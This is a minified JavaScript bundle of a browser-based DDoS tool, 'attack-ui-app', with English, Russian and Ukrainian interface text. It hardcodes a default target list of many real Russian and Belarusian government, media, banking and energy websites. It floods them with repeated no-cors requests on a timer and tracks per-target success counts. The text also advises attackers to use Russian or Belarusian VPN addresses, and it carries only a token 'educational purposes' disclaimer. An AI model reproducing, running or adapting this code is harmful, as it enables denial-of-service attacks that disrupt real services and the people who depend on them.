(()=>{"use strict";var t={7590:(t,e,a)=>{a(8156),a(6509);var r=a(4779),s=a(7233),o=a(536);function n(t,e){const a=(0,o.up)("router-view");return(0,o.wg)(),(0,o.j4)(a)}var i=a(9895);const l={},u=(0,i.Z)(l,[["render",n]]),c=u;var d=a(2266),p=a(6780),g=a(8597);const f=[{name:"MainLayout",path:"/",component:()=>Promise.all([a.e(736),a.e(572)]).then(a.bind(a,8572)),children:[{name:"Index",path:"/",component:()=>a.e(780).then(a.bind(a,8780)),redirect:{name:"DdosConfig"}},{name:"AttackLayout",path:"/attack",component:()=>Promise.all([a.e(736),a.e(505)]).then(a.bind(a,3505)),redirect:{name:"Index"},children:[{name:"DdosConfig",path:"ddos/config",component:()=>Promise.all([a.e(736),a.e(131)]).then(a.bind(a,9131))},{name:"DdosAttack",path:"ddos/start",component:()=>Promise.all([a.e(736),a.e(422)]).then(a.bind(a,1422))},{name:"DdosDock",path:"dock/ddos",component:()=>a.e(89).then(a.bind(a,7089))}]}]},{path:"/:catchAll(.*)*",component:()=>Promise.all([a.e(736),a.e(837)]).then(a.bind(a,2143)),beforeEnter:(t,e,a)=>{-1!==t.path.indexOf("http")?(console.log("to.fullPath.substring(1) = ",t.fullPath.substring(1)),window.open(t.fullPath.substring(1))):a()}}],h=f,m=(0,p.BC)((function(){const t=g.PO,e=(0,g.p7)({scrollBehavior:()=>({left:0,top:0}),routes:h,history:t("/")});return e}));async function b(t,e){const r="function"===typeof d["default"]?await(0,d["default"])({}):d["default"],{storeKey:o}=await Promise.resolve().then(a.bind(a,2266)),n="function"===typeof m?await m({store:r}):m;r.$router=n;const i=t(c);return i.use(s.Z,e),{app:i,store:r,storeKey:o,router:n}}var w=a(1712),k=a(652);const v={config:{},plugins:{Notify:w.Z,Dialog:k.Z}},y="/";async function L({app:t,router:e,store:a,storeKey:r},s){let o=!1;const n=t=>{try{return e.resolve(t).href}catch(a){}return Object(t)===t?null:t},i=t=>{if(o=!0,"string"===typeof t&&/^https?:\/\//.test(t))return void(window.location.href=t);const e=n(t);null!==e&&(window.location.href=e)},l=window.location.href.replace(window.location.origin,"");for(let c=0;!1===o&&c<s.length;c++)try{await s[c]({app:t,router:e,store:a,ssrContext:null,redirect:i,urlPath:l,publicPath:y})}catch(u){return u&&u.url?void i(u.url):void console.error("[Quasar] boot error:",u)}!0!==o&&(t.use(e),t.use(a,r),t.mount("#q-app"))}b(r.ri,v).then((t=>Promise.all([Promise.resolve().then(a.bind(a,4615)),Promise.resolve().then(a.bind(a,7917))]).then((e=>{const a=e.map((t=>t.default)).filter((t=>"function"===typeof t));L(t,a)}))))},4615:(t,e,a)=>{a.r(e),a.d(e,{default:()=>d,i18n:()=>u});var r=a(6780),s=a(2496);const o={attackPage:{pageTitle:"DDOS Dashboard",stopBtnLabel:"Stop",actionsHint:"Stop/Start can take up to 1 minute",startBtnLabel:"Start",statusTitle:"Status",ddosAttackConfigureBtnLabel:"Attack setting",attackActiveStatusLabel:"Active",attackStoppedStatusLabel:"Stopped",resultsCardTitle:"Results",table:{target:"Target",success:"Success requests",errors:"Errors count"},totalResults:{error:"Errors",success:"Successful requests"}},attackConfigPage:{pageTitle:"DDOS Configuration",connectionsTitle:"Connections",reqCountFieldLabel:"Request limit per interval",reqCountFieldHint:"Recommended quantity - 100",streamsCountLabel:"Streams count",streamsCountHint:"In development",resetConfigBtnLabel:"Reset",startAttackBtnLabel:"Start attack",intervalTimeFieldLabel:"Interval length",intervalTimeFieldHint:"In milliseconds",removeAllTargetsBtnLabel:"Remove All Targets",targetsCardTitle:"Targets",addTargetFieldLabel:"Link/ip to target",addTargetBtnLabel:"Add",targetTooltipText:"Click to open in a new tab",invalidTargetNotify:"It doesn`t look like a url or ip address",targetaAreadyAddedNotify:"Target already added",targetAddedNotify:"Target added",errorReqDefaultNotify:"Error requesting default targets",attackStartedDialog:{title:"Attack started",description:'Until you press the "Stop" button or close the tab, the attack will be active. Startup may take up to 1 minute',okBtnLabel:"Ok"}},updatesNotify:{title:"New Version",message:"We have released a new version of the application. The attack will resume immediately after the update",okBtnLabel:"Update now",cancelBtnLabel:"Later"},nav:{ddosDasboardLabel:"DDOS Dashboard",ddosConfigLabel:"DDOS Config",telegram:"We`re on Telegram"},ipNotify:{title:"Use VPN with Russian or Belarusian IP for more effective attack",ipLabel:"Your IP",countryLabel:"IP Country",reloadBtnLabel:"Reload",updatedAtLabel:"Last updated at"},denialOfResponsibilityWarning:{message:"This project should only be used for testing or educational purposes",okBtnLabel:"Ok"}},n={attackPage:{pageTitle:"Панель управления DDOS",stopBtnLabel:"Остановить",startBtnLabel:"Начать",ddosAttackConfigureBtnLabel:"Настроить атаку",actionsHint:"Остановка/Начало могут занять до 1 минуты",statusTitle:"Статус",attackActiveStatusLabel:"Атака в процессе",attackStoppedStatusLabel:"Остановлена",resultsCardTitle:"Результаты атаки",table:{target:"Цель",success:"Успешных запросов",errors:"Ошибок"},totalResults:{error:"Ошибок",success:"Успешных запросов"}},attackConfigPage:{pageTitle:"Настройка DDOS",connectionsTitle:"Запросы",reqCountFieldLabel:"Лимит запросов за интервал",reqCountFieldHint:"Рекомендуемое количество - 100",streamsCountLabel:"Количство потоков",streamsCountHint:"В разработке",resetConfigBtnLabel:"Восстановить по умолчанию",startAttackBtnLabel:"Начать атаку",intervalTimeFieldLabel:"Длина интервала",intervalTimeFieldHint:"В миллисекундах",removeAllTargetsBtnLabel:"Удалить все цели",targetsCardTitle:"Цели",addTargetFieldLabel:"Ссылка или IP",addTargetBtnLabel:"Добавить",targetTooltipText:"Нажмите, чтобы открыть в новой вкладке",invalidTargetNotify:"Это не похоже на URL или IP адрес",targetaAreadyAddedNotify:"Цель уже добавлена",targetAddedNotify:"Цель добавлена",errorReqDefaultNotify:"Ошибка при запросе целей по умолчанию",attackStartedDialog:{title:"Атака началась",description:'Пока вы не нажмете кнопку "Стоп" или не закроете вкладку, атака будет активной. Запуск может занять до 1 минуты',okBtnLabel:"Ок"}},updatesNotify:{title:"Новая версия",message:"Мы выпустили новую версию приложения. Атака возобновиться сразу же после обновления",okBtnLabel:"Обновить сейчас",cancelBtnLabel:"Позже"},nav:{ddosDasboardLabel:"Управление DDOS",ddosConfigLabel:"Настройка DDOS",telegram:"Мы в Telegram"},ipNotify:{title:"Используйте VPN с российским или белорусским IP для более эффективной атаки",ipLabel:"Ваш IP",countryLabel:"IP нахожиться в",reloadBtnLabel:"Обновить",updatedAtLabel:"Последнее обновление в"},denialOfResponsibilityWarning:{message:"Этот проект должен использоваться только для тестирования или образовательных целей",okBtnLabel:"Ок"}},i={attackPage:{pageTitle:"Панель керування DDOS",stopBtnLabel:"Зупинити",startBtnLabel:"Почати",ddosAttackConfigureBtnLabel:"Налаштувати атаку",actionsHint:"Зупинка/Початок може тривати до 1 хвилини",statusTitle:"Статус",attackActiveStatusLabel:"Атака в процесі",attackStoppedStatusLabel:"Зупинено",resultsCardTitle:"Результати атаки",table:{target:"Мета",success:"Успішних запитів",errors:"Помилок"},totalResults:{error:"Помилок",success:"Успішних запитів"}},attackConfigPage:{pageTitle:"Налаштування DDOS",connectionsTitle:"Запити",reqCountFieldLabel:"Ліміт запитів за інтервал",reqCountFieldHint:"Рекомендована кількість - 100",streamsCountLabel:"Кількість потоків",streamsCountHint:"У розробці",intervalTimeFieldLabel:"Довжина інтервалу",intervalTimeFieldHint:"У мілісекундах",resetConfigBtnLabel:"Відновити за замовчуванням",startAttackBtnLabel:"Почати атаку",removeAllTargetsBtnLabel:"Видалити всі цілі",targetsCardTitle:"Цілі",addTargetFieldLabel:"Посилання або IP",addTargetBtnLabel:"Додати",targetTooltipText:"Натисніть, щоб відкрити нову вкладку",invalidTargetNotify:"Це не схоже на URL або IP адресу",tarjetaAreadyAddedNotify:"Мета вже додана",targetAddedNotify:"Мета додана",errorReqDefaultNotify:"Помилка за запитом стандартних цілей",attackStartedDialog:{title:"Атака почалася",description:'Поки ви не натиснете кнопку "Стоп" або не закриєте вкладку, атака буде активною. Запуск може тривати до 1 хвилини',okBtnLabel:"Ок"}},updatesNotify:{title:"Нова версія",message:"Ми випустили нову версію програми. Атака відновиться відразу після оновлення",okBtnLabel:"Оновити зараз",cancelBtnLabel:"Пізніше"},nav:{ddosDasboardLabel:"Керування DDOS",ddosConfigLabel:"Налаштування DDOS",telegram:"Ми в Telegram"},ipNotify:{title:"Використовуйте VPN з російським або білоруським IP для більш ефективної атаки",ipLabel:"Ваш IP",countryLabel:"IP знаходиться в",reloadBtnLabel:"Оновити",updatedAtLabel:"Останнє оновлення"},denialOfResponsibilityWarning:{message:"Цей проект повинен використовуватися тільки для тестування або освітніх цілей",okBtnLabel:"Ок"}},l={en:o,ru:n,ua:i};let u,c=localStorage.getItem("lang")||navigator.language||navigator.userLanguage;-1===Object.keys(l).indexOf(c)&&(c="en");const d=(0,r.xr)((({app:t})=>{u=(0,s.o)({legacy:!1,locale:c,messages:l}),t.use(u)}))},7917:(t,e,a)=>{a.r(e),a.d(e,{default:()=>c});var r=a(6780),s=a(1539),o=a(1651);let n,i=!1;const l=async()=>{try{const t=await fetch("/app.config.json"),e=await t.json();return e.version}catch(t){return console.error(t),"1.0.1"}},u=async t=>{if(i)return;i=!0;const e=await(0,s.V)({title:(0,o.a)("updatesNotify.title")+` ${t}`,message:(0,o.a)("updatesNotify.message"),okLabel:(0,o.a)("updatesNotify.okBtnLabel"),cancelLabel:(0,o.a)("updatesNotify.cancelBtnLabel")});if(!e)return clearInterval(n),void(i=!1);location.reload()},c=(0,r.xr)((({app:t})=>{n=setInterval((async()=>{const t=await l();"1.0.1"!==t&&u(t)}),5e3)}))},1539:(t,e,a)=>{a.d(e,{V:()=>s});var r=a(652);const s=async({title:t,message:e,okLabel:a,cancelLabel:s})=>await new Promise((o=>{r.Z.create({title:t,message:e,cancel:!!s,ok:{label:a,noCaps:!0,color:"dark"},cancel:{label:s,noCaps:!0,flat:!0,color:"red"}}).onOk((()=>{o(!0)})).onOk((()=>{o(!0)})).onCancel((()=>{o(!1)})).onDismiss((()=>{o(!1)}))}))},1651:(t,e,a)=>{a.d(e,{a:()=>s});var r=a(4615);const s=t=>r.i18n.global.t(t)},2266:(t,e,a)=>{a.r(e),a.d(e,{default:()=>K});var r={};a.r(r),a.d(r,{getBrowserAttackIntervalId:()=>h,getBrowserAttackResults:()=>f,getBrowserAttackStatus:()=>g,getCommonResultsBrowserAttack:()=>m,getDdosConfig:()=>d,getResultsBrowserAttack:()=>p,getTargetsList:()=>c});var s={};a.r(s),a.d(s,{removeAllTargets:()=>S,removeTarget:()=>P,resetDdosConfig:()=>N,setBrowserAttackIntervalId:()=>F,setBrowserAttackStatus:()=>q,setCommonResultsBrowserAttack:()=>R,setDdosConfig:()=>O,setInitTargets:()=>I,setResultsBrowserAttack:()=>j,setTarget:()=>D});var o={};a.r(o),a.d(o,{destroyBrowserAttack:()=>M,initBrowserAttack:()=>U,setDefaultTargets:()=>V});var n=a(6780),i=a(3721),l=a(4883);function u(){return{targetsList:[],config:{user:{},default:{reqCount:100,intervalLength:300}},resultsBrowserAttack:{},commonResultsBrowserAttack:{success:0,error:0},browserAttackStatus:!1,browserAttackIntervalId:null}}a(6509);const c=t=>t.targetsList,d=t=>t.config,p=t=>t.resultsBrowserAttack,g=t=>t.browserAttackStatus,f=t=>Object.entries(t.resultsBrowserAttack).map((([t,e])=>({target:t,...e}))),h=t=>t.browserAttackIntervalId,m=t=>t.commonResultsBrowserAttack;var b=a(1712);const w={timeout:1500,progress:!0,actions:[{icon:"close",color:"white"}]},k=t=>(b.Z.create({type:"negative",message:t,...w}),!0),v=t=>{b.Z.create({message:t,...w})};a(7918);var y=a(7790),L=a.n(y),A=a(3245),T=a.n(A),C=a(1651);const B=(t,e)=>{if(t)if(L()(t)||T()(t)){if(!(e.indexOf(t.trim())>-1))return!0;k((0,C.a)("attackConfigPage.targetaAreadyAddedNotify"))}else k((0,C.a)("attackConfigPage.invalidTargetNotify"))},S=t=>{t.targetsList=[]},P=(t,e)=>{t.targetsList.splice(e,1)},D=(t,{target:e,callback:a})=>{t.targetsList.indexOf(e)>0||B(e,t.targetsList)&&(t.targetsList.unshift(e),v((0,C.a)("attackConfigPage.targetAddedNotify")),a&&a())},I=(t,e)=>{S(t),t.targetsList.push(...e)},O=(t,e)=>{for(const a in e)e[a]=Number(e[a]);t.config.user=e},N=t=>{t.config.user=t.config.default},R=(t,e)=>{t.commonResultsBrowserAttack[e]++},j=(t,e)=>{const a=t.resultsBrowserAttack;for(const r in e){a[r]||(a[r]={success:0,error:0});const s=e[r]?"success":"error";a[r][s]++,R(t,s)}},q=(t,e)=>{t.browserAttackStatus=e},F=(t,e)=>{t.browserAttackIntervalId=e},x=async()=>["https://lenta.ru/","https://ria.ru/","https://ria.ru/lenta/","https://www.rbc.ru/","https://www.rt.com/","http://kremlin.ru/","http://en.kremlin.ru/","https://smotrim.ru/","https://tass.ru/","https://tvzvezda.ru/","https://vsoloviev.ru/","https://www.1tv.ru/","https://www.vesti.ru/","https://online.sberbank.ru/","https://sberbank.ru/","https://zakupki.gov.ru/","https://www.gosuslugi.ru/","https://er.ru/","https://www.rzd.ru/","https://rzdlog.ru/","https://vgtrk.ru/","https://www.interfax.ru/","https://www.mos.ru/uslugi/","http://government.ru/","https://mil.ru/","https://www.nalog.gov.ru/","https://customs.gov.ru/","https://pfr.gov.ru/","https://rkn.gov.ru/","https://www.gazprombank.ru/","https://www.vtb.ru/","https://www.gazprom.ru/","https://lukoil.ru","https://magnit.ru/","https://www.nornickel.com/","https://www.surgutneftegas.ru/","https://www.tatneft.ru/","https://www.evraz.com/ru/","https://nlmk.com/","https://www.sibur.ru/","https://www.severstal.com/","https://www.metalloinvest.com/","https://nangs.org/","https://rmk-group.ru/ru/","https://www.tmk-group.ru/","https://ya.ru/","https://www.polymetalinternational.com/ru/","https://www.uralkali.com/ru/","https://www.eurosib.ru/","https://ugmk.ua/","https://omk.ru/","https://sputniknews.com/","https://lt.sputniknews.ru/","https://baltnews.lt/","https://sputniknews.ru/","https://regnum.ru/\t","https://iz.ru/","https://eadaily.com/","https://www.rubaltic.ru/","http://www.fsb.ru/","https://president.gov.by/ru","https://etpgpb.ru","https://api.etpgpb.ru","https://etp.gpb.ru/","https://passport.etpgpb.ru","https://gos.etpgpb.ru","https://inter-rao.etpgpb.ru","https://rosnedra.etpgpb.ru ","https://gpn.etpgpb.ru","https://geh.etpgpb.ru","https://trade.etpgpb.ru","https://gb.etpgpb.ru","https://koronapay.com","https://api.koronapay.com"];a(1832);var E=a(1539);const H={},_=t=>{if(!H[t])return H[t]={error:0,success:0,unconfirmCount:0},!0;const e=!(0===H[t]["success"]&&H[t]["error"]>30),a=200;return!e&&H[t].unconfirmCount<=a?H[t].unconfirmCount++:!e&&H[t].unconfirmCount>a&&(H[t].error=0,e=!0),e},z=async(t,e)=>await new Promise(((a,r)=>{if(!e.getters.getBrowserAttackStatus)return void a({});const s={},o=[];for(let i=0;i<t.length;i++)try{if(!e.getters.getBrowserAttackStatus)return void a({});const r=t[i];if(!_(r))continue;o.push(r);const n=new AbortController,l=setTimeout((()=>n.abort()),1e4);fetch(r,{method:"GET",mode:"no-cors",signal:n.signal}).then((()=>{s[r]=!0,H[r].success++})).catch((()=>{s[r]=!1,H[r].error++})).finally((()=>{clearTimeout(l),e.getters.getBrowserAttackStatus?Object.keys(s).length===o.length&&a(s):a(s)}))}catch(n){console.error(n)}})),Z=()=>{(0,E.V)({title:(0,C.a)("attackConfigPage.attackStartedDialog.title"),message:(0,C.a)("attackConfigPage.attackStartedDialog.description"),okLabel:(0,C.a)("attackConfigPage.attackStartedDialog.okBtnLabel")})},V=async t=>{try{if(t.getters.getTargetsList.length>0)return;const e=await x();t.commit("setInitTargets",e)}catch(e){k((0,C.a)("attackConfigPage.errorReqDefaultNotify")),console.error(e)}},U=t=>{const e=t.getters.getDdosConfig.user,a=t.getters.getTargetsList;if(0===a.length)return;const r=t.getters.getBrowserAttackIntervalId;t.commit("setBrowserAttackStatus",!0);let s=0;const o=setInterval((async()=>{if(!t.getters.getBrowserAttackStatus)return;const r=s>=a.length?0:s+1,o=r+e.reqCount;s=o;const n=a.slice(r,o),i=await z(n,t);t.commit("setResultsBrowserAttack",i)}),Number(e.intervalLength)?Number(e.intervalLength):1e3);t.commit("setBrowserAttackIntervalId",o),r||setTimeout((()=>{Z()}),1e3)},M=t=>{const e=t.getters.getBrowserAttackIntervalId;clearInterval(e),t.commit("setBrowserAttackIntervalId",null),t.commit("setBrowserAttackStatus",!1)},W={namespaced:!0,state:u,getters:r,mutations:s,actions:o},K=(0,n.h)((function(){const t=new l.ZP({storage:window.localStorage}),e=(0,i.MT)({modules:{ddos:W},plugins:[t.plugin],strict:!1});return e}))}},e={};function a(r){var s=e[r];if(void 0!==s)return s.exports;var o=e[r]={exports:{}};return t[r](o,o.exports,a),o.exports}a.m=t,(()=>{var t=[];a.O=(e,r,s,o)=>{if(!r){var n=1/0;for(c=0;c<t.length;c++){for(var[r,s,o]=t[c],i=!0,l=0;l<r.length;l++)(!1&o||n>=o)&&Object.keys(a.O).every((t=>a.O[t](r[l])))?r.splice(l--,1):(i=!1,o<n&&(n=o));if(i){t.splice(c--,1);var u=s();void 0!==u&&(e=u)}}return e}o=o||0;for(var c=t.length;c>0&&t[c-1][2]>o;c--)t[c]=t[c-1];t[c]=[r,s,o]}})(),(()=>{a.n=t=>{var e=t&&t.__esModule?()=>t["default"]:()=>t;return a.d(e,{a:e}),e}})(),(()=>{a.d=(t,e)=>{for(var r in e)a.o(e,r)&&!a.o(t,r)&&Object.defineProperty(t,r,{enumerable:!0,get:e[r]})}})(),(()=>{a.f={},a.e=t=>Promise.all(Object.keys(a.f).reduce(((e,r)=>(a.f[r](t,e),e)),[]))})(),(()=>{a.u=t=>"js/"+t+"."+{89:"d7040120",131:"e5cae807",422:"eae7ab67",505:"0d478b7f",572:"a0494415",780:"d95d6502",837:"99a7429f"}[t]+".js"})(),(()=>{a.miniCssF=t=>"css/"+({143:"app",736:"vendor"}[t]||t)+"."+{131:"7d3fd480",143:"4cf142da",505:"043d59a9",736:"f35281a0"}[t]+".css"})(),(()=>{a.g=function(){if("object"===typeof globalThis)return globalThis;try{return this||new Function("return this")()}catch(t){if("object"===typeof window)return window}}()})(),(()=>{a.o=(t,e)=>Object.prototype.hasOwnProperty.call(t,e)})(),(()=>{var t={},e="attack-ui-app:";a.l=(r,s,o,n)=>{if(t[r])t[r].push(s);else{var i,l;if(void 0!==o)for(var u=document.getElementsByTagName("script"),c=0;c<u.length;c++){var d=u[c];if(d.getAttribute("src")==r||d.getAttribute("data-webpack")==e+o){i=d;break}}i||(l=!0,i=document.createElement("script"),i.charset="utf-8",i.timeout=120,a.nc&&i.setAttribute("nonce",a.nc),i.setAttribute("data-webpack",e+o),i.src=r),t[r]=[s];var p=(e,a)=>{i.onerror=i.onload=null,clearTimeout(g);var s=t[r];if(delete t[r],i.parentNode&&i.parentNode.removeChild(i),s&&s.forEach((t=>t(a))),e)return e(a)},g=setTimeout(p.bind(null,void 0,{type:"timeout",target:i}),12e4);i.onerror=p.bind(null,i.onerror),i.onload=p.bind(null,i.onload),l&&document.head.appendChild(i)}}})(),(()=>{a.r=t=>{"undefined"!==typeof Symbol&&Symbol.toStringTag&&Object.defineProperty(t,Symbol.toStringTag,{value:"Module"}),Object.defineProperty(t,"__esModule",{value:!0})}})(),(()=>{a.p="/"})(),(()=>{var t=(t,e,a,r)=>{var s=document.createElement("link");s.rel="stylesheet",s.type="text/css";var o=o=>{if(s.onerror=s.onload=null,"load"===o.type)a();else{var n=o&&("load"===o.type?"missing":o.type),i=o&&o.target&&o.target.href||e,l=new Error("Loading CSS chunk "+t+" failed.\n("+i+")");l.code="CSS_CHUNK_LOAD_FAILED",l.type=n,l.request=i,s.parentNode.removeChild(s),r(l)}};return s.onerror=s.onload=o,s.href=e,document.head.appendChild(s),s},e=(t,e)=>{for(var a=document.getElementsByTagName("link"),r=0;r<a.length;r++){var s=a[r],o=s.getAttribute("data-href")||s.getAttribute("href");if("stylesheet"===s.rel&&(o===t||o===e))return s}var n=document.getElementsByTagName("style");for(r=0;r<n.length;r++){s=n[r],o=s.getAttribute("data-href");if(o===t||o===e)return s}},r=r=>new Promise(((s,o)=>{var n=a.miniCssF(r),i=a.p+n;if(e(n,i))return s();t(r,i,s,o)})),s={143:0};a.f.miniCss=(t,e)=>{var a={131:1,505:1};s[t]?e.push(s[t]):0!==s[t]&&a[t]&&e.push(s[t]=r(t).then((()=>{s[t]=0}),(e=>{throw delete s[t],e})))}})(),(()=>{var t={143:0};a.f.j=(e,r)=>{var s=a.o(t,e)?t[e]:void 0;if(0!==s)if(s)r.push(s[2]);else{var o=new Promise(((a,r)=>s=t[e]=[a,r]));r.push(s[2]=o);var n=a.p+a.u(e),i=new Error,l=r=>{if(a.o(t,e)&&(s=t[e],0!==s&&(t[e]=void 0),s)){var o=r&&("load"===r.type?"missing":r.type),n=r&&r.target&&r.target.src;i.message="Loading chunk "+e+" failed.\n("+o+": "+n+")",i.name="ChunkLoadError",i.type=o,i.request=n,s[1](i)}};a.l(n,l,"chunk-"+e,e)}},a.O.j=e=>0===t[e];var e=(e,r)=>{var s,o,[n,i,l]=r,u=0;if(n.some((e=>0!==t[e]))){for(s in i)a.o(i,s)&&(a.m[s]=i[s]);if(l)var c=l(a)}for(e&&e(r);u<n.length;u++)o=n[u],a.o(t,o)&&t[o]&&t[o][0](),t[o]=0;return a.O(c)},r=self["webpackChunkattack_ui_app"]=self["webpackChunkattack_ui_app"]||[];r.forEach(e.bind(null,0)),r.push=e.bind(null,r.push.bind(r))})();var r=a.O(void 0,[736],(()=>a(7590)));r=a.O(r)})();